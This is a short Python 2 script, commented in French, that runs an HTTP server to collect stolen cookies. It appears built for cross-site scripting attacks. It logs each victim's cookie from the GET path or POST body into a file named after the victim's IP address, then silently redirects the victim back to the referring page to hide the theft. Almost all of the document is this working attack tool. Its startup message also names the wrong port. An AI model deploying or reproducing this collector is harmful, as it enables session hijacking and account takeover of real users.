#!/usr/bin/env python
#-*-coding:UTF-8-*-
from BaseHTTPServer import BaseHTTPRequestHandler
import urlparse

#####################################################################################
#                                       Variable Globale                            #
#####################################################################################
PORT_NUMBER = 80



#####################################################################################
# Description de la fonction									                    #
# @param param : le paramètre                                                       #
# @return return : le paramètre de retour		                                    #
#####################################################################################

class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        referer=self.headers.get('referer')
        cookie=self.path
        clientIP=self.address_string()
        self.send_response(302)
        self.send_header('Location',referer)
        self.end_headers()
        with open("cookie_from_{}.txt".format(clientIP),"w") as cookieFile:
            cookieFile.write(cookie)
        return

    def do_POST(self):
        content_len = int(self.headers.getheader('content-length'))
        post_body = self.rfile.read(content_len)
        clientIP=self.address_string()
        self.send_response(200)
        self.end_headers()
        with open("cookie_from_{}.txt".format(clientIP),"w") as cookieFile:
            cookieFile.write(post_body)
        return

if __name__ == '__main__':
    from BaseHTTPServer import HTTPServer
    server = HTTPServer(('0.0.0.0', 80), GetHandler)
    print 'Starting server at http://localhost:8080'
    server.serve_forever()
